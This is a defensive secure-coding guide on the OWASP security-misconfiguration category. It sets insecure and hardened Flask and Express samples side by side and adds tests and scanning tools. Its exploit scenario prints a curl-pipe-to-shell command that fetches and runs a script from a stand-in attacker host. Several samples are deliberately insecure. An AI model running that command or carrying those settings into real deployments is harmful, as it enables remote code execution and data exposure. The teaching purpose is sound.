# A05 — Security Misconfiguration

## What it is

Security misconfiguration covers every bug caused by a setting that should have been different: debug mode left on in production, default credentials never changed, detailed error messages returned to the client, CORS configured to trust any origin, cloud storage buckets set to world-readable, security headers missing, unused framework features left enabled. The code is often correct; the deployment is wrong. The category spans application frameworks, web servers, cloud services, databases, and every dependency that has a configuration file.

Misconfigurations outnumber code bugs in real incident data. The reason is simple: configuration lives in N different files across N different systems, each owned by a different team, with no compiler checking the combination. A scanner that catches `debug=True` in one Python file does not catch the same semantic misconfiguration as an `X-Robots-Tag` header missing on an S3-hosted static site.

## Why it matters

A concrete exploit: a startup deploys a Flask application with `app.run(debug=True)` inside a Docker container, because "debug mode gives us useful error messages." The container runs behind an ALB reachable from the internet. An attacker triggers an unhandled exception — any of a dozen ways: malformed Content-Type, overlong URL, unparseable JSON. The Werkzeug debugger renders an interactive Python console on the error page. The attacker enters `import os; os.system("curl -fsSL evil.example.com/r.sh | sh")` and has remote code execution as the container user. If the container has an instance profile with broad IAM permissions, the attacker has that too. This is the class of bug that built Patreon's 2015 breach, and it still ships in 2026.

Other common shapes:

- **Default credentials**: a database, Redis instance, or Kubernetes dashboard deployed with the vendor's default password and left unchanged.
- **Overly verbose error pages**: stack traces, SQL fragments, or internal service names in 500-response bodies.
- **CORS `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`**: explicitly forbidden combination; any origin can make authenticated cross-origin requests.
- **Public cloud storage buckets**: S3, GCS, or Azure Blob buckets with `public-read` or broad-principal policies.
- **Management interfaces exposed**: a staging Kubernetes dashboard, a Swagger UI in production, a Prometheus endpoint reachable without authentication.
- **Missing security headers**: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`, `Referrer-Policy`.
- **Permissive IAM policies**: roles with `*:*` actions, resource-policy trust relationships that allow any account.

## How to find it

**Manual review indicators.** Every `config.py`, `settings.py`, `application.yml`, `helmet()` call, `CORS(...)` call, Terraform variable block, Kubernetes manifest, and CI/CD workflow deserves a look during review. Specific things to check:

- `DEBUG = True`, `debug=True`, `app.run(debug=True)`, `NODE_ENV !== 'production'` without production branch behavior.
- Default / placeholder credentials in committed config files.
- Framework error-handler configuration — does production use a sanitizing handler?
- CORS middleware configuration.
- Security header middleware (`helmet`, `flask-talisman`, `django-csp`) installed and configured.
- Any `--insecure-*`, `verify=False`, `rejectUnauthorized: false`, `insecure: true` flags.
- Storage bucket policies, IAM policies, security-group rules with `0.0.0.0/0`.

**Automated signals.**

- Semgrep: `python.flask.security.audit.debug-enabled`, `python.django.security.audit.debug-enabled`, `javascript.express.security.audit.express-cors` (permissive CORS).
- Semgrep custom rule: `flask-debug-true` (this repo).
- Checkov: `CKV_AWS_20` (S3 bucket ACL), `CKV_AWS_53` / `CKV_AWS_54` / `CKV_AWS_55` / `CKV_AWS_56` (block public access), `CKV_AWS_18` (S3 access logging), `CKV_AWS_66` (CloudTrail enabled), `CKV_AWS_79` (IMDSv2 required).
- Checkov: `CKV_K8S_*` for Kubernetes misconfigurations (privileged containers, host-network pods, etc).
- gitleaks: catches committed secrets (often the same content as "default credentials left in config").
- Runtime scanning: `testssl.sh` for TLS configuration, `nuclei` for exposed management panels.
- Cloud config scanning: Prowler, Scout Suite, AWS Security Hub, GCP Security Command Center.

## How to fix it — Python

**Vulnerable.**
```python
# Flask app — debug mode on, no security headers, permissive CORS.
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)
app.config["SECRET_KEY"] = "insecure-dev-key"
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)

@app.errorhandler(500)
def server_error(err):
    # Returns the full exception text in the response body.
    return str(err), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=5000)
```

**Secure.**
```python
import os
import logging

from flask import Flask, jsonify
from flask_cors import CORS
from flask_talisman import Talisman

# Fail fast on missing required config. Every required env var is
# declared and the process does not start without them.
REQUIRED = ["FLASK_SECRET_KEY", "ALLOWED_ORIGINS", "ENV"]
missing = [v for v in REQUIRED if not os.environ.get(v)]
if missing:
    raise SystemExit(f"missing required env vars: {missing}")

app = Flask(__name__)
app.config.update(
    SECRET_KEY=os.environ["FLASK_SECRET_KEY"],
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    PREFERRED_URL_SCHEME="https",
)

# CORS: specific origins only, never "*" with credentials.
CORS(
    app,
    origins=os.environ["ALLOWED_ORIGINS"].split(","),
    supports_credentials=True,
    methods=["GET", "POST", "PATCH", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
)

# Security headers in one place. Content Security Policy tuned per app.
Talisman(
    app,
    content_security_policy={
        "default-src": "'self'",
        "img-src": ["'self'", "data:"],
        "script-src": "'self'",
        "connect-src": "'self'",
        "frame-ancestors": "'none'",
    },
    force_https=True,
    strict_transport_security=True,
    strict_transport_security_max_age=31_536_000,
    strict_transport_security_include_subdomains=True,
    strict_transport_security_preload=True,
    referrer_policy="strict-origin-when-cross-origin",
)

@app.errorhandler(500)
def server_error(err):
    # Log the full error server-side, return a sanitized response.
    logging.exception("unhandled error", exc_info=err)
    return jsonify(error="internal error", request_id=request_id()), 500

# Gunicorn is the production WSGI server. Never app.run() on a deploy path.
# The "if __name__" block only exists to discourage the wrong pattern.
if __name__ == "__main__":
    raise SystemExit("use gunicorn; do not run Flask's dev server in production")
```

## How to fix it — JavaScript

**Vulnerable.**
```javascript
const express = require("express");
const cors = require("cors");

const app = express();
app.use(express.json({ limit: "50mb" }));
// Any origin, with credentials — explicitly forbidden combo.
app.use(cors({ origin: "*", credentials: true }));
// No helmet. No rate limiting. No error handler (defaults leak stacks).

app.get("/secret", (req, res) => { res.json({ secret: process.env.DB_PASSWORD }); });

app.listen(3000);
```

**Secure.**
```javascript
const express = require("express");
const helmet = require("helmet");
const cors = require("cors");
const rateLimit = require("express-rate-limit");
const { z } = require("zod");

// Validate required env on startup; fail fast.
const EnvSchema = z.object({
  NODE_ENV: z.enum(["development", "test", "production"]),
  ALLOWED_ORIGINS: z.string().min(1),
  COOKIE_SECRET: z.string().min(32),
  JWT_PUBLIC_KEY: z.string().min(1),
});
const env = EnvSchema.parse(process.env);

const app = express();
app.use(express.json({ limit: "100kb" }));
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
    },
  },
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
  crossOriginOpenerPolicy: { policy: "same-origin" },
}));

app.use(cors({
  origin: env.ALLOWED_ORIGINS.split(","),
  credentials: true,
  methods: ["GET", "POST", "PATCH", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));

// Rate limits are scoped per-endpoint in practice; this is the global floor.
app.use(rateLimit({ windowMs: 60_000, max: 300, standardHeaders: true, legacyHeaders: false }));

app.use((err, req, res, next) => {
  req.log?.error({ reqId: req.id, err }, "unhandled error");
  res.status(err.status ?? 500).json({ error: "internal error", reqId: req.id });
});

app.listen(3000);
```

## How to test the fix

**pytest (Python).**
```python
def test_production_rejects_debug_mode():
    with pytest.raises(SystemExit):
        os.environ.pop("FLASK_SECRET_KEY", None)
        import importlib, myapp
        importlib.reload(myapp)

def test_security_headers_are_present(client):
    resp = client.get("/")
    assert resp.headers["Strict-Transport-Security"].startswith("max-age=31536000")
    assert "default-src 'self'" in resp.headers["Content-Security-Policy"]
    assert resp.headers["Referrer-Policy"] == "strict-origin-when-cross-origin"
    assert resp.headers["X-Content-Type-Options"] == "nosniff"

def test_error_response_does_not_leak_stack_trace(client):
    # Route that intentionally raises.
    resp = client.get("/trigger-500")
    assert resp.status_code == 500
    assert "Traceback" not in resp.text
    assert "request_id" in resp.json()
```

**Jest (JavaScript).**
```javascript
describe("security headers and CORS", () => {
  it("sets HSTS, CSP, referrer-policy", async () => {
    const res = await request(app).get("/");
    expect(res.headers["strict-transport-security"]).toMatch(/^max-age=\d+;/);
    expect(res.headers["content-security-policy"]).toContain("default-src 'self'");
    expect(res.headers["referrer-policy"]).toBe("strict-origin-when-cross-origin");
  });

  it("rejects cross-origin requests from origins not on the allowlist", async () => {
    const res = await request(app)
      .options("/api/resource")
      .set("Origin", "https://evil.example.com")
      .set("Access-Control-Request-Method", "POST");
    expect(res.headers["access-control-allow-origin"]).toBeUndefined();
  });

  it("does not set Access-Control-Allow-Origin: * with credentials", async () => {
    const res = await request(app).get("/api/resource")
      .set("Origin", "https://app.example.com");
    expect(res.headers["access-control-allow-origin"]).not.toBe("*");
  });
});

describe("error responses do not leak details", () => {
  it("returns a sanitized body on 500", async () => {
    const res = await request(app).get("/__trigger_500");
    expect(res.status).toBe(500);
    expect(res.body).toEqual({ error: "internal error", reqId: expect.any(String) });
    expect(res.text).not.toMatch(/at \S+:\d+:\d+/);  // no stack lines
  });
});
```

## Compliance mapping

| Framework | Control | Relevance |
| --- | --- | --- |
| **HIPAA Security Rule** | §164.308(a)(1)(ii)(D) — Information System Activity Review | Regular configuration reviews are in-scope. |
| **HIPAA Security Rule** | §164.310(d)(1) — Device and Media Controls | Hardened configuration of devices/VMs handling ePHI. |
| **SOC 2 Trust Services Criteria** | CC6.6 — Logical Access Controls Over External Connections | Network exposure, firewall configuration, CORS settings. |
| **SOC 2 Trust Services Criteria** | CC7.1 — Detection and Monitoring of System Vulnerabilities | Configuration scanning is the detective control for this category. |
| **SOC 2 Trust Services Criteria** | CC8.1 — Change Management | Configuration changes follow the same change-control process as code. |
| **NIST CSF 2.0** | PR.PS-01 — Configuration management practices are applied | Directly in-scope — the subcategory is configuration management. |
| **NIST CSF 2.0** | PR.IR-01 — Networks and environments are protected from unauthorized logical access | Permissive CORS, open management interfaces, default credentials. |
| **NIST CSF 2.0** | DE.CM-09 — Computing hardware and software, runtime environments, and their data are monitored | Continuous configuration monitoring via tools like Prowler or Security Hub. |

For PCI-DSS v4, this maps to Requirement 1 (install and maintain network security controls), Requirement 2 (apply secure configurations to all system components), and Requirement 6.4.1 (protection of applications in production through secure configuration).
